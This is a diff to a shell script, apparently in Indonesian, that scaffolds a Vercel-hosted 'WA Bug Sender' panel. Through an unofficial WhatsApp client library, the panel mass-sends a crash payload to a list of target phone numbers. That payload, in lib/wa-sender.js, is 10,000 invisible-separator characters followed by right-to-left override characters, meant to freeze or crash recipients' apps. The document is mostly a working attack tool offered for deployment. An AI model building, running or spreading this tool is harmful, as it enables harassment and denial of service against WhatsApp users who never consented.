@@ -1,84 +1,162 @@
+# ganti URL di bawah dgn URL repo yg baru kamu buat
+git clone https://github.com/Baby/wa-bug-vercel-otp.git
+cd wa-bug-vercel-otp
+
+# ─────────────────────────────────────────────
+#  A. buat folder & file
+# ─────────────────────────────────────────────
+mkdir -p public api lib sessions
+
+# 1) public/index.html  ─ panel UI
+cat > public/index.html <<'HTML'
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>WA Bug Sender Panel</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background-color: #f4f4f4;
-      padding: 30px;
-      text-align: center;
-    }
-    input, textarea, button {
-      width: 300px;
-      padding: 10px;
-      margin: 10px auto;
-      display: block;
-      font-size: 16px;
-    }
-    #qrBox {
-      margin-top: 20px;
-      display: none;
-    }
-    img {
-      border: 1px solid #ccc;
-      padding: 10px;
-      background: white;
-    }
-  </style>
-</head>
-<body>
+<meta charset="UTF-8"><title>WA Bug Sender OTP</title>
+<style>body{font-family:sans-serif;text-align:center;padding:30px}input,textarea,button{margin:10px;padding:10px;width:300px;font-size:16px;display:block}</style>
+</head><body>
+<h2>🔐 Verifikasi Nomor WhatsApp</h2>
+<input id="phone" placeholder="Nomor WA (62xxxx)">
+<button onclick="requestOTP()">Minta OTP</button>
 
-  <h2>📱 Verifikasi Nomor WhatsApp Kamu</h2>
-  <input id="sender" type="text" placeholder="Masukkan nomor kamu (62xxxx)">
-  <button onclick="verifikasi()">🔐 Verifikasi & Dapatkan QR</button>
+<div id="otpDiv" style="display:none">
+  <input id="otp" placeholder="Masukkan Kode OTP">
+  <button onclick="verifyOTP()">Verifikasi</button>
+</div>
 
-  <div id="qrBox">
-    <h3>Scan QR Code Ini dari WhatsApp Kamu</h3>
-    <img id="qrImage" src="" width="300">
-  </div>
+<div id="bugDiv" style="display:none">
+  <h3>🎯 Kirim Bug ke Banyak Nomor</h3>
+  <textarea id="targets" rows="5" placeholder="Satu nomor per baris (62xxxx)"></textarea>
+  <button onclick="sendBug()">🚀 Kirim Bug</button>
+</div>
 
-  <hr style="margin: 40px 0">
+<script>
+let phone="";
 
-  <h2>🎯 Kirim Bug ke Banyak Target</h2>
-  <textarea id="targets" rows="6" placeholder="Masukkan daftar nomor (1 per baris)"></textarea>
-  <button onclick="kirimBug()">🚀 Kirim Bug Sekarang</button>
+async function requestOTP(){
+  phone=document.getElementById('phone').value.trim();
+  if(!phone)return alert("Isi nomor dulu!");
+  const r=await fetch('/api/request-otp.js',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone})});
+  const d=await r.json();
+  alert(d.message||"OTP dikirim!"); if(d.success)otpDiv.style.display="block";
+}
+async function verifyOTP(){
+  const code=document.getElementById('otp').value.trim();
+  const r=await fetch('/api/verify-otp.js',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,code})});
+  const d=await r.json();
+  alert(d.message); if(d.success){bugDiv.style.display="block"; otpDiv.style.display="none";}
+}
+async function sendBug(){
+  const targets=document.getElementById('targets').value.trim().split('\\n').filter(Boolean);
+  const r=await fetch('/api/sendbug.js',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,targets})});
+  const d=await r.json(); alert(d.message);
+}
+</script></body></html>
+HTML
 
-  <script>
-    async function verifikasi() {
-      const sender = document.getElementById("sender").value.trim();
-      if (!sender) return alert("Masukkan nomor kamu dulu!");
+# 2) lib/otp.js  ─ simpan & validasi OTP (in-memory)
+cat > lib/otp.js <<'JS'
+const store=new Map();  // phone -> {code,expires}
+export function setOTP(phone,code){
+  store.set(phone,{code,expires:Date.now()+5*60e3}); // 5 menit
+}
+export function verifyOTP(phone,code){
+  const d=store.get(phone);
+  if(!d||Date.now()>d.expires)return false;
+  return d.code===code;
+}
+JS
 
-      const res = await fetch(`/api/verify.js?sender=${sender}`);
-      const data = await res.json();
+# 3) lib/wa-sender.js ─ bot WA pengirim OTP & bug
+cat > lib/wa-sender.js <<'JS'
+import makeWASocket from '@whiskeysockets/baileys';
+import { useSingleFileAuthState } from '@whiskeysockets/baileys';
+import P from 'pino';
+import fs from 'fs';
 
-      if (data.qr) {
-        document.getElementById("qrImage").src = data.qr;
-        document.getElementById("qrBox").style.display = "block";
-        alert("QR Code berhasil dibuat! Scan sekarang!");
-      } else {
-        alert("Gagal verifikasi: " + (data.error || "Unknown Error"));
-      }
-    }
+const {state,saveState}=useSingleFileAuthState('./bot-session.json');
+const sock=makeWASocket({auth:state,logger:P({level:'silent'})});
+sock.ev.on('creds.update',saveState);
 
-    async function kirimBug() {
-      const sender = document.getElementById("sender").value.trim();
-      const targets = document.getElementById("targets").value.trim().split('\n').filter(x => x);
+export async function sendOTP(phone,code){
+  const jid=phone.replace(/\D/g,'')+'@s.whatsapp.net';
+  await sock.sendMessage(jid,{text:`Kode verifikasi WA-BUG kamu: ${code}`});
+}
 
-      if (!sender || targets.length === 0) {
-        return alert("Isi nomor pengirim dan minimal 1 target!");
-      }
+export async function sendBug(targets){
+  const bug='\u2063'.repeat(10000)+'\u202e\u202e\u202e';
+  for(const t of targets){
+    const jid=t.replace(/\D/g,'')+'@s.whatsapp.net';
+    await sock.sendMessage(jid,{text:bug});
+  }
+}
+JS
 
-      const res = await fetch('/api/sendbug.js', {
-        method: 'POST',
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ sender, targets })
-      });
+# 4) api/request-otp.js
+cat > api/request-otp.js <<'JS'
+import { setOTP } from '../lib/otp.js';
+import { sendOTP } from '../lib/wa-sender.js';
 
-      const data = await res.json();
-      alert(data.message || "Selesai!");
-    }
-  </script>
-</body>
-</html>
+export default async (req,res)=>{
+  const {phone}=await req.json();
+  if(!phone)return res.status(400).json({message:'Phone required'});
+  const code=Math.floor(1000+Math.random()*9000);
+  setOTP(phone,code);
+  await sendOTP(phone,code);
+  res.json({success:true,message:'OTP dikirim!'});
+};
+JS
+
+# 5) api/verify-otp.js
+cat > api/verify-otp.js <<'JS'
+import { verifyOTP } from '../lib/otp.js';
+export default async (req,res)=>{
+  const {phone,code}=await req.json();
+  if(verifyOTP(phone,code)){
+    res.json({success:true,message:'Verifikasi berhasil'});
+  }else res.json({success:false,message:'OTP salah / kedaluwarsa'});
+};
+JS
+
+# 6) api/sendbug.js
+cat > api/sendbug.js <<'JS'
+import { verifyOTP } from '../lib/otp.js';
+import { sendBug } from '../lib/wa-sender.js';
+export default async (req,res)=>{
+  const {phone,targets}=await req.json();
+  if(!verifyOTP(phone,null)) return res.status(403).json({message:'Belum verifikasi'});
+  await sendBug(targets);
+  res.json({message:'Bug terkirim ke semua target!'});
+};
+JS
+
+# 7) vercel.json
+cat > vercel.json <<'JSON'
+{
+  "version":2,
+  "builds":[{"src":"api/*.js","use":"@vercel/node"}],
+  "routes":[
+    {"src":"/api/(.*)", "dest":"/api/$1.js"},
+    {"src":"/","dest":"/public/index.html"}
+  ]
+}
+JSON
+
+# 8) package.json
+cat > package.json <<'JSON'
+{
+  "name":"wa-bug-vercel-otp",
+  "version":"1.0.0",
+  "dependencies":{
+    "@whiskeysockets/baileys":"^6.6.0",
+    "pino":"^8.0.0"
+  }
+}
+JSON
+
+# ─────────────────────────────────────────────
+#  B. commit & push
+# ─────────────────────────────────────────────
+git add .
+git commit -m "Initial commit: WA Bug Sender OTP (Vercel ready)"
+git push origin main
